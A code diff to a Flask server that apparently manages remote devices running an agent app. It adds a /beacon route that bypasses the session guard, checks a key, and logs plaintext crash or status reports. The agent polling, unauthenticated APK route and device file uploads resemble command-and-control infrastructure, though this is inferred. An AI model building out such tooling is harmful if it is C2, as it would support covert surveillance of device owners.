@@ -51,6 +51,8 @@ def guard():
         return
     if request.path.startswith("/apk") or request.path.startswith("/poll"):
         return
+    if request.path.startswith("/beacon"):
+        return
     if not authed():
         if request.path.startswith("/api/"):
             return jsonify({"error": "unauthorized"}), 401
@@ -180,6 +182,33 @@ def upload():
     models.touch_device(device_id)
     models.insert_file(device_id, kind, safe, os.path.getsize(dest), dest)
     return jsonify({"ok": True, "path": dest}), 200
+
+
+@app.route("/beacon", methods=["POST"])
+def beacon():
+    """Plaintext status beacon from the agent.
+
+    The regular channel is encrypted and batched, so a device that dies during
+    startup would leave no trace. The beacon is a small plain POST that
+    proves the app is alive and carries the crash report.
+    """
+    key = request.form.get("k", "")
+    if not _key_ok(key):
+        return jsonify({"error": "bad key"}), 403
+    payload = request.form.get("d", "")
+    kind = request.form.get("kind", "beacon")
+    if not payload:
+        return jsonify({"error": "missing d"}), 400
+    device_id = "unknown"
+    try:
+        parsed = json.loads(payload)
+        if isinstance(parsed, dict):
+            device_id = str(parsed.get("device_id") or "unknown")
+    except Exception:
+        pass
+    models.touch_device(device_id)
+    models.insert_log(device_id, f"beacon:{kind}", payload[:4000])
+    return jsonify({"ok": True}), 200
 
 
 @app.route("/poll")
